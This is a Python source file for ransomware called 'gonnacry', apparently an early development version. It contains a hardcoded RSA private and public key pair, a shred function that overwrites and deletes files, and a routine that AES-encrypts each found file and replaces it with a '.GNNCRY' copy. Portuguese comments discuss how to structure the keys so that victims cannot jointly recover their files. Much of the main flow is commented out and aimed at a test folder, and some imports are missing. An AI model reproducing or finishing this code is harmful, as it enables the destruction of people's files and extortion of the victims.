#!/bin/bash/env python
# coding=UTF-8

import os
import asymmetric
import get_files
import symmetric
import enviroment
import generate_keys
from Crypto.PublicKey import RSA
import gc
from Crypto.Hash import MD5
import base64


# const variables
server_public_key = ("""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxF5BOX3N5UN1CsHpnfuU
58lOw0+scQ39hOn6Q/QvM6aTOnYZki57O6/JtgV2CetE+G5IZrRwYPAipFdChGM9
RNZVegpnmGQCSRPlkfjN0TjfCFjaUX80PgRVm0ZHaeCeoNjit0yeW3YZ5nBjPjNr
36BLaswJo1zbzhctK2SYX+Miov04D3iC83Vc8bbJ8Wiip4jpKPDFhyO1I3QkykL0
4T1+tQXaGujLzc3QxJN3wo8rWkQ4CaLAu1pb9QkdYhFG0D3TrljkRNiH0QnF3Asc
XAQNI94ZPaqD6e2rWcSy2ZMiKVJgCWA40p9qe34H8+9ub3TgC52oSyapwbxzqs5v
DQIDAQAB
-----END PUBLIC KEY-----""")

server_private_key = """-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAxF5BOX3N5UN1CsHpnfuU58lOw0+scQ39hOn6Q/QvM6aTOnYZ
ki57O6/JtgV2CetE+G5IZrRwYPAipFdChGM9RNZVegpnmGQCSRPlkfjN0TjfCFja
UX80PgRVm0ZHaeCeoNjit0yeW3YZ5nBjPjNr36BLaswJo1zbzhctK2SYX+Miov04
D3iC83Vc8bbJ8Wiip4jpKPDFhyO1I3QkykL04T1+tQXaGujLzc3QxJN3wo8rWkQ4
CaLAu1pb9QkdYhFG0D3TrljkRNiH0QnF3AscXAQNI94ZPaqD6e2rWcSy2ZMiKVJg
CWA40p9qe34H8+9ub3TgC52oSyapwbxzqs5vDQIDAQABAoIBAC3HA1GRwGQH+8sM
NZf8xFPcnB3v/vVEG6vWl98rl61k0cG5MnDfoR7i9hUW5NOfIy7/FqXKvr/6ezjw
lrMiJ3BavwZ6Ung2KEo89zG2XNS/e08I16xUCSvD+uj90zwdfx1kMkYk+G299H/C
B4DCoA074xj8g+qvhRZgVMle5B7F/gdun6AUGSxHC5uFmibM39MmMuSH16oJGcn5
0VRBmaB8vqMOFIyVKraoX4XAQwKE3by/VTM0kxBjmUZeUs2C1Paag7g09TuzQbXm
y3Tsv4aCZwrZlEXaFHopGz3HVHot2Ps3Qaq8WD76+SbzBm3pHayo3cDXvQwC1L7O
i/bihAkCgYEA23sqvBSVdMtWF+ktSXkt2OfVJsFpp3ym+qm2U5q9M+BTeyf4dnfP
/+Z5O5x6blFyf7ug8h2+8b0L6o34QfuaSXbJBtpmFS2GqG8B3KAYC4nnxonUxGuZ
ECc7wJRvo22A55rKVicmDWWr8rqNmbrNy9eoWUNYvNEouwr9nSW2Z9MCgYEA5QqW
rkUnmbIFd5gEKX+m9IKTUZ+dbuh1oHO3QqgmpeyZdxIvNa5C3bwuk6WBFGMjtCNl
NZeLGN8plcwlPxGEdCBTnhmKw0ikQWubYCx/NNNI2sWXidiym2bHI+2JkdOVx0HA
OU27+sbxyjqExCID+9b+c+t3MKZlzshif7L/YZ8CgYBLu8ZVO+0ObhN5ELbVwYC2
ddixFNA2QOcFW4ZUdvKOcfucZYBwsIsPTCHNFgORCX2u4bl5khYPKCJyfyaI7h6g
9uILAVV0PU9X02YbEQr7AEz/zxOh61bXohIWM6IKDIEMafcjn0KcINciXIj74N+e
VP38PybhkHKzh+lXTmoQjQKBgBKDHZSuUDoS8nAtIED+aU8f8qpJPV9GeKNkVu6T
SrRkgC7okFpFYHAtkpIqcVllffBEYBzJx9tVxjWuT2BemRcNudRweg+4olYLTX6j
ehCZ9yx/hfUFR8JZt0THITRhJpz5SoEXMFdflxFiU3LK0Qmc4eoaoQKUoGvrNFLf
89Y/AoGABgsbLx258EPtVqgY9uS9ta/XpUyKKjVGIqEY+jhn9lNhxQK+0iRQvD6C
eSopcx2e09eODLXAxOpi+f6K2mxJVMjxhvIthnad4vhtJjaBojaMG23+uOpX9Gj/
u7KSAN0pGuIw57saMWU1KFy2POKHI8+PP4rGeJhKx6isAt+3ZFk=
-----END RSA PRIVATE KEY-----"""

ransomware_name = ("gonnacry")



def shred(file_name,  passes=1):

    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    if not os.path.isfile(file_name):
        print(file_name + " is not a file.")
        return False

    ld = os.path.getsize(file_name)
    fh = open(file_name,  "w")
    for _ in range(int(passes)):
        data = generate_data(ld)
        fh.write(data)
        fh.seek(0,  0)

    fh.close()
    os.remove(file_name)


def start_encryption(files):
    AES_keys = []
    AES_and_base64_path = []
    for found_file in files:
        key = generate_keys.generate_key(32, True)
        AES_keys.append(key)
        AES_obj = symmetric.AESCipher(key)

        with open(found_file, 'rb') as f:
            file_content = f.read()
        
        encrypted = AES_obj.encrypt(file_content)
        shred(found_file)

        new_file_name = found_file + ".GNNCRY"
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        base64_new_file_name = base64.b64encode(new_file_name)

        # list of tuples of AES_key and base64(path)
        AES_and_base64_path.append((key, base64_new_file_name))
    
    return AES_and_base64_path




def menu():

    # enviroment paths
    home = enviroment.get_home_path()
    desktop = enviroment.get_desktop_path()
    username = enviroment.get_username()
    ransomware_path = os.path.join(home, ransomware_name)
    test_path = "/home/tarcisio/teste/"

    # create ransomware directory 
    # try:
    #     os.mkdir(ransomware_path, 0600)
    # except OSError:
    #     print('Directory exists')

    # get the files in the home directory
    # /home/$USER
    files = get_files.find_files(test_path)


    # create RSA object
    rsa_object = asymmetric.assymetric()
    rsa_object.generate_keys()
    
    server_public_key_object = RSA.importKey(server_public_key)

    Client_private_key = rsa_object.private_key_PEM
    Client_public_key = rsa_object.public_key_PEM
    print(Client_private_key)
    # encrypt the client private key with servers public key
    crypted = server_public_key_object.encrypt(Client_private_key, 'x')[0]


    # print(encrypted_private_key)

    # with open(ransomware_path + "encrypted_private_key", 'wb') as f:
    #     f.write(encrypted_private_key)

    # with open(ransomware_path + "client_public_key", 'wb') as f:
    #     f.write(Client_public_key)
    
    # # Free the memory from keys
    # Client_private_key = None
    # Client_public_key = None 
    # rsa_object = None
    # gc.collect()
    
    # # check if keys where desallocated


    # # Get the client public key back
    # with open(ransomware_path + "client_public_key") as f:
    #     Client_public_key = f.read()
    # client_public_key_object =  RSA.importKey(Client_public_key)
    

    # # ENCRYPTION STARTS HERE !!!
    # aes_keys_and_base64_path = start_encryption(files)
    # enc_aes_key_and_base64_path = []

    # for _ in aes_keys_and_base64_path:
    #     aes_key = _[0]
    #     base64_path = _[1]

    #     # encrypt with the client public key
    #     encrypted_aes_key = client_public_key_object.encrypt(aes_key, 'x')[0]
    #     enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
    
    # # free the old AES keys
    # aes_keys_and_base64_path = None
    # gc.collect()

    # # save to disk -> ENC(AES) BASE64(PATH)
    # with open(ransomware_path + "AES_encrypted_keys", 'w') as f:
    #     for _ in enc_aes_key_and_base64_path:
    #         line = _[0] + " " + _[1] + "\n"
    #         f.write(line)

    # gc.collect()
    # # TODO
    # # encrypt all the AES keys with Client public key 
    # # create file with description of what happened
    # # change wallpaper
    # # create file with all encrypted files path's

    # AES for each file and encrypt AES.keys with Spub.key
    # é ruim porque infectados podem se juntar para decrypt todos os arquivos AES
    # não tem algo que é unico para cada infecção que é o key pair 
     
    # AES for each file and encrypt AES.keys with Cpub.key and encrypt Cpriv.key with Spub.key 
    # pode assinar o dado de cada vitma a ela mesma, 
    # gera um nível a mais de dependencia 



def change_wallpaper():
    img = """"""
    with open("img.png", 'wb') as f:
        f.write(img.base64.b64decode(img))
    os.system('gsettings set org.gnome.desktop.background picture-uri {}'.format("img.png"))


if __name__ == "__main__":
    menu()





